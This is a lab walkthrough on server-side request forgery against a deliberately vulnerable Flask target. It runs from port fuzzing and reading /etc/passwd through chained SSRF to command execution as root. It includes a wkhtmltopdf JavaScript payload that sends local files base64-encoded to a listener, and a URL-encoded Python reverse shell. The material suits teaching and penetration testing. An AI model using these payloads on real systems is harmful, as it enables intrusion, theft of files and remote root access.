Server-Side Request Forgery (`SSRF`) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

-   Interacting with known internal systems
-   Discovering internal services via port scans
-   Disclosing local/sensitive data
-   Including files in the target application
-   Leaking NetNTLM hashes using UNC Paths (Windows)
-   Achieving remote code execution

We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for:

-   Parts of HTTP requests, including URLs
-   File imports such as HTML, PDFs, images, etc.
-   Remote server connections to fetch data
-   API specification imports
-   Dashboards including ping and similar functionalities to check server statuses

**Note:** Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.

--- 

#### Nmap - Discovering Open Ports

```sh
$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>

Nmap scan report for <TARGET IP>
Host is up (0.00047s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

Let's issue a cURLrequest to the target server using the parameters `-i` to show the protocol response headers and `-s` to use the silent mode.

#### Curl - Interacting with the Target

```sh
$ curl -i -s http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
```

We can see the request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`. Let us follow the redirect to see if we can gather any additional information.

```sh
$ curl -i -s -L http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```

The spawned target is `ubuntu-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position).

The next step is to confirm if the `q` parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say "may" because a trust relationship likely exists for `ubuntu-web` to be able to reach and interact with `internal.app.local`. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).

In one terminal, let's use Netcat to listen on port 8080, as follows.

#### Netcat Listener

```sh
$ nc -nvlp 8080

listening on [any] 8080 ...
```

Now, let us issue a request to the target web application with `http://<VPN/TUN Adapter IP>` instead of `index.html` in another terminal, as follows. `<VPN/TUN Adapter IP>` will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key).

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 12:07:10 GMT
```

We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using [Python-urllib](https://docs.python.org/3.8/library/urllib.html)

#### Netcat Listener - Confirming SSRF

```shell-session
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```

Reading the [Python-urllib](https://docs.python.org/3.8/library/urllib.html) documentation, we can see it supports `file`, `http` and `ftp` schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the `file` schema and remote files using `ftp`.

We can test this functionality through the steps below:

1. Create a file called index.html
```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

2. Inside the directory where index.html is located, start an HTTP server using the following command

#### Start Python HTTP Server

```sh
$ python3 -m http.server 9090
```

3. Inside the directory where index.html is located, start an FTP Server via the following command

#### Start FTP Server

```sh
$ sudo pip3 install twisted
$ sudo python3 -m twisted ftp -p 21 -r .
```

4. Retrieve index.html through the target application using the `ftp` schema, as follows

#### Retrieving a remote file through the target application - FTP Schema

```sh
$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:21:09 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```

5. Retrieve index.html through the target application using the `http` schema, as follows

#### Retrieving a remote file through the target application - HTTP Schema

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:26:18 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```

6. Retrieve a local file using the file schema, as follows

#### Retrieving a local file through the target application - File Schema

```shell-session
$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 926
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:27:17 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Bear in mind that fetching remote HTML files can lead to Reflected XSS.

Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:

1.  Generate a wordlist containing all possible ports.

#### Generate a Wordlist

```sh
$ for port in {1..65535};do echo $port >> ports.txt;done
```

2.  Issue a cURL request to a random port to get the response size of a request for a non-existent service.

#### Curl - Interacting with the Target

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused
```

3.  Use ffuf with the wordlist and discard the responses which have the size we previously identified.

#### Port Fuzzing

```sh
$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 30
________________________________________________

80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::
```

We have received a valid response for port `5000`. Let us check it as follows.

#### cURL - Interacting with the Target

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:47:16 GMT

<html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>
```

Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the `internal.app.local` web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.

First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the `q` parameter).

#### cURL - Interacting with the Target

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
```

Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.

#### cURL - Interacting with the Target

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```

We have received an `unknown url type` error message. It seems the web application is removing `://` from our request. Let's try to overcome this situation by modifying the URL.

#### cURL - Interacting with the Target

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>
```

In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.

#### Port Fuzzing

```sh
$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Errno[[:blank:]]111
________________________________________________

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
```

We have found another application listening on port 5000. In this case, the application responds with a list of files.

```shell-session
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:30:07 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>
```

Let us make a quick recap of what we have achieved:

-   Issue requests on behalf of ubuntu-web to internal.app.local
-   Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities
-   Disclose a list of files via the internal application

Let us now uncover the source code of the web applications listening on `internal.app.local` to see how we can achieve remote code execution.

Let us issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable.

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 584
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 16:52:20 GMT

<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
```

Now we know that the current path is `/app`, and we have a list of interesting files. Let's disclose the `internal_local.py` file as follows.

#### Retrieving a local file through the target application - File Schema

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 771
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:40:28 GMT

<html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    result = stdout.decode() + " " + stderr.decode()
    return result

@app.route("/")
def index():
    return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>
```

By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to`/runme?x=<CMD>`. Let us confirm remote code execution by sending `whoami` as a command.

```sh
]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 93
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:48:32 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
 </a></body></html>
```

We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?

```sh
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 586

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>
```

To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.

For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:

```sh
$ echo "encode me" | jq -sRr @uri
encode%20me%0A
```

#### Automate executing commands

```sh
]$ function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```

```sh
$ rce
# uname -a; hostname; whoami

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
</h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
a054d48cc0a4
root
 </a></body></html>
```

---

## Blind SSRF

Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:

-   [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) (Part of Burp Suite professional. Not Available in the community edition)
-   http://pingb.in

Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

![](blind1_.png)
![](response_blind1_.png)

If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes.

Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. This service can be a web server hosted in a machine we own, Burp Collaborator, a Pingb.in URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.

```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

For the sake of simplicity, the service we will use to test for a blind SSRF vulnerability will be a simple Netcat listener running in Pwnbox or a local VM and listening on port 9090. If you are using a local VM, remember to use the supplied VPN key. So, on the above HTML file, `SERVICE IP` should be the `VPN/TUN IP` of Pwnbox or your local VM, and `PORT` should be `9090`.

```sh
$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090
```

After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF.

![](blind2__.png)

By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:

`Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`

Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.

```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

In this case, we are using two [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) objects, one for reading the local file and another one to send it to our server. Also, we are using the `btoa` function to send the data encoded in Base64.

Let us start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed, as follows.

```sh
$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090
GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.221:9090
```

```sh
$ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application (`internal.app.local`) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution).

#### Bash Reverse Shell

```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```html
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```

```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

```sh
$ nc -nvlp 9090

listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root
```